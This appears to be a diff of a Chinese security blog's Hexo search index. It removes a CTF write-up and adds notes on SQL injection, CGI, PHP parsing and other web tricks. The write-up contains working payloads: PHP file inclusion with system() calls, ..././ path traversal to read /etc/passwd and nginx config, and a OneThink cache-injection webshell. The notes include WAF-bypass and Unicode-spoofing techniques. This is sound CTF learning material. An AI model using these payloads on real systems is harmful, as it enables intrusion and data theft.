-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/4.jpg" alt></p>
-<h2 id="四-：include"><a href="#四-：include" class="headerlink" title="四 ：include"></a>四 ：include</h2><p>打开看到代码在左上角</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>根据提示是文件包含漏洞</p>
-<p>就看phpinfo中的allow_url_include是否开启</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/5.jpg" alt></p>
-<p>开启的，就可以用php伪协议 php://input进行包含</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/6.jpg" alt></p>
-<p>用<?php echo system('ls') ?>列出目录</p>
-<p>发现有个 dle345aae.php 文件，用php://filter读取文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?path=php://filter/read=convert.base64-encode/resource=dle345aae.php</span><br></pre></td></tr></table></figure>
-
-<p>得到base64加密后的flag</p>
-<p>解密得到flag</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/7.jpg" alt></p>
-<h2 id="五-：-Zone"><a href="#五-：-Zone" class="headerlink" title="五 ： Zone"></a>五 ： Zone</h2><p>打开链接是一个登录框，尝试sql注入，没发现注入点。看源码也没发现线索</p>
-<p>然后想到抓包分析，看到response包有个参数是 login=0</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/8.jpg" alt></p>
-<p>然后把login改成1，登录成功，但是显示是乱码。</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/9.jpg" alt></p>
-<p>看到url有点特殊</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind../ex&amp;name=php</span><br></pre></td></tr></table></figure>
-
-<p>返回正常，应该过滤了../</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.ph?module=ind.././ex&amp;name=php</span><br></pre></td></tr></table></figure>
-
-<p>返回错误，没过滤./，所以可以构造…/./进行绕过过滤</p>
-<p>测试文件读取</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/passwd&amp;name=</span><br></pre></td></tr></table></figure>
-
-<p>查看下服务器是nginx。找一下它的配置文件，在自己的kali下，用以下命令查找：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# find / -name &quot;nginx.conf&quot;</span><br></pre></td></tr></table></figure>
-
-<p>，返回 /etc/nginx/nginx.conf</p>
-<p>读取该配置文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://f325bbb20d854d3fb14b3e100775cbd873a664048d4742a4.changame.ichunqiu.com/manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name=</span><br></pre></td></tr></table></figure>
-
-<p>返回中有</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include sites-enabled/default</span><br></pre></td></tr></table></figure>
-
-<p>继续读取该文件</p>
-<p>在该文件里，发现 </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /online-movies &#123;</span><br><span class="line">            alias /movie/;</span><br><span class="line">            autoindex on;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里边的 autoindex on  ，即为允许目录浏览。访问/online-movies ,发现页面上显示../即可浏览目录下载文件。访问/online-movies../var/www/html/flag.php    下载该文件，获得flag</p>
-<h2 id="六-：-OneThink"><a href="#六-：-OneThink" class="headerlink" title="六 ： OneThink"></a>六 ： OneThink</h2><p>google OneThink 1.0的漏洞</p>
-<p>参考大佬的<a href="https://ox1234.github.io/2018/07/27/OneThink%20CMS%E7%9A%84%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a></p>
-<p>1、注册账号名为： %0aphpinfo();#  的账号   //  %0a是换行符的意思，缓存到文件的时候起换行作用</p>
-<p>2、填写好注册信息进行抓包 ,  burp抓包的时候  把%0a 进行url解码1次  以换行了为准</p>
-<p>3、注册完之后进行登陆，同样要抓包，把%0a进行url解码1次；</p>
-<p>4、登陆成功之后，访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php路径文件，会发现phpinfo()被解析           //该文件地址及文件名是固定的；</p>
-<p>5、同样的方法注册俩个账号： %0a$a=$_GET[a];//   和   %0asystem($a);//  </p>
-<p>6、注册完之后，要登陆俩个账号  才能把账号名写入到文件当中</p>
-<p>7、访问Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=cat ../../flag.php 获取flag    //通过ls  ../的方式翻目录进行flag寻找；最后cat的 flag在源码中会显示</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
+    <title>SQL注入</title>
+    <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<blockquote>
+<ul>
+<li>对表名为纯数字的表进行操作时，要在前后加上`符号。</li>
+<li>对列名进行更改时，要在后面指定修改后的数据类型  </li>
+<li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li>
+</ul>
+</blockquote>]]></content>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2019/11/24/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+    <title>CGI模式</title>
+    <url>/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>CGI是common gateway interface的缩写，大家都译作通用网关接口 </p>
+<p>这个规则会将header中的proxy参数设置为环境变量HTTP_PROXY </p>
+</blockquote><h3 id="CGI介绍"><a href="#CGI介绍" class="headerlink" title="CGI介绍"></a>CGI介绍</h3><p>​    总所周知，web服务器所处理的任务都是静态的，假如其要想处理动态的任务，则需要web应用程序的帮助，比如PHP，jsp，python，perl等为了将web服务器的动态请求传递给这些应用程序，依靠cgi协议。</p><a id="more"></a>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p> 简单的cgi工作方式： </p>
+<p><img src="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/CGI%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F.png" alt></p>
+<blockquote>
+<p> 有多种方式可以执行cgi程序，但对http的请求方法来说，只有get和post两种方法允许执行cgi脚本(即上面的search程序)。实际上post方法的内部本质还是get方法，只不过在发送http请求时，get和post方法对url中的参数处理方式不一样而已。 </p>
+</blockquote>
+<p> 通过cgi协议，再结合已搭建好的web应用程序，就可以让web server也能”处理”动态请求(或者说，当用户访问某个特定资源时，可以触发执行某个web应用程序来实现特定功能) ,例如，在谷歌搜索栏中搜索一个关键词”http”，对应的URL为： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.google.com/search?q=http&amp;oq=http&amp;aqs=chrome..69i57j69i60l4j0.1136j0j8&amp;sourceid=chrome&amp;ie=UTF-8</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>当谷歌的web server收到该请求后，先分析该url，从中知道了要执行search程序，并且还知道了一系列要传递给search的参数及其对应的value。web server会将这些程序参数和其它一些环境变量根据cgi协议通过TCP或套接字等方式传递给已启动的cgi程序(可能是cgi进程，或者是已加载的模块cgi模块)。当cgi进程接收到web server的请求后，调用search程序并执行，同时还会传递参数给search程序。search执行结束后，cgi进程/线程将处理结果返回给web server，web server再返回给浏览器。</p>
+<p>任何一种语言都能编写CGI，只不过有些语言比较擅长，有些语言则非常繁琐，例如用bash shell开发，那么需要用echo等打印语句将执行结果放在巨多无比的html的标签中输出给客户端。常用于编写CGI的语言有perl、php、python等，java也一样能写，但java的servlet完全能实现CGI的功能，且更优化、更利于开发。</p>
+<h3 id="各种术语释疑"><a href="#各种术语释疑" class="headerlink" title="各种术语释疑"></a>各种术语释疑</h3><p> 刚接触cgi概念的时候肯定会有一堆疑问，这到底是什么鬼，处理动态内容的东西不是像php一样的应用程序吗 ？</p>
+<p>以php为例，我将一次动态请求相关的概念大致都简单解释一遍。</p>
+<ol>
+<li><code>cgi</code>：它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序。</li>
+<li><code>fastcgi</code>：也是一种协议，只不过是cgi的优化版。cgi的性能较烂，fastcgi则在其基础上进行了改进。</li>
+<li><code>php-cgi</code>：fastcgi是一种协议，而php-cgi实现了这种协议。不过这种实现比较烂。它是单进程的，一个进程处理一个请求，处理结束后进程就销毁。</li>
+<li><code>php-fmp</code>：是对php-cgi的改进版，它直接管理多个php-cgi进程/线程。也就是说，<strong>php-fpm是php-cgi的进程管理器</strong>因此它也算是fastcgi协议的实现。在一定程度上讲，php-fpm与php的关系，和tomcat对java的关系是类似的。</li>
+<li><code>cgi进程/线程</code>：在php上，就是php-cgi进程/线程。专门用于接收web server的动态请求，<strong>调用并初始化zend虚拟机</strong>。</li>
+<li><code>cgi脚本</code>：被执行的php源代码文件。</li>
+<li><code>zend虚拟机</code>：对php文件做词法分析、语法分析、编译成opcode，并执行。最后关闭zend虚拟机。</li>
+<li><code>cgi进程/线程和zend虚拟机的关系</code>：cgi进程调用并初始化zend虚拟机的各种环境。</li>
+</ol>
+<p>以php-fpm为例，web server从转发动态请求到结束的过程大致如下：</p>
+<p>![](CGI模式/web server从转发动态请求到结束过程.png)</p>
+<h3 id="web-server和CGI的交互模式"><a href="#web-server和CGI的交互模式" class="headerlink" title="web server和CGI的交互模式"></a>web server和CGI的交互模式</h3><p>​    web server对cgi进程/线程来说，它的作用就是发起动态处理请求，传递一些参数和环境变量，最后接收cgi的返回结果。再通俗而不严谨地说，web server通过cgi/fastcgi协议将动态请求转发给执行cgi脚本的应用程序。通过下面httpd.conf中的转发配置应该很容易理解(httpd和php-fpm的交互)：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProxyRequests off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/usr/local/apache/htdocs/$1</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>以最典型的apache httpd和php为例，对于httpd来说，web server和php-cgi有3种交互模式。</p>
+<ul>
+<li><code>cgi模式</code>：httpd接收到一个动态请求就fork一个cgi进程，cgi进程返回结果给httpd进程后自我销毁。</li>
+<li><code>动态模块模式</code>：将php-cgi的模块(例如php5_module)编译进httpd。在httpd启动时会加载模块，加载时也将对应的模块激活，php-cgi也就启动了。(注：纠正一个小小错误，很多人以为动态编译的模块是可以在需要的时候随时加载调用，不需要的时候它们就停止了，实际上不是这样的。和静态编译的模块一样，动态加载的模块在被加载时就被加入到激活链表中，无论是否使用它，它都已经运行在apache httpd的内部。可参考LoadModule指令的官方手册)</li>
+<li><code>php-fpm模式</code>：使用php-fpm管理php-cgi，此时httpd不再控制php-cgi进程的启动。可以将php-fpm独立运行在非web服务器上，实现所谓的动静分离。</li>
+</ul>
+<p>实际上，借助模块mod_fastcgi还可以实现fastcgi模式。同cgi一样，管理模式的先天缺陷决定了这并不是一种好方法。</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>笔记</title>
+    <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure>
+
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
+<blockquote>
+<p>1.删除空白符</p>
+</blockquote>
+<blockquote>
+<p>2.将某些字符转换为下划线（包括空格）</p>
+</blockquote>
+<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以在num前加个空格：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure>
+
+<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<h1 id="php别名"><a href="#php别名" class="headerlink" title="php别名"></a>php别名</h1><blockquote>
+<p>php2, php3, php4, php5, phps, pht, phtm, phtml </p>
+</blockquote>
+<h1 id="CVE-2018-12613漏洞"><a href="#CVE-2018-12613漏洞" class="headerlink" title="CVE-2018-12613漏洞"></a>CVE-2018-12613漏洞</h1><blockquote>
+<p>这个漏洞利用了一个性值：如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：</p>
+<p>hint.php%25%3F（%25%3F是?的二次编码）</p>
+<p>那么解析时会把hint.php当作一个目录来看。</p>
+</blockquote>
+<h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><blockquote>
+<p>利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。 </p>
+</blockquote>
+<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
   </entry>
 </search>
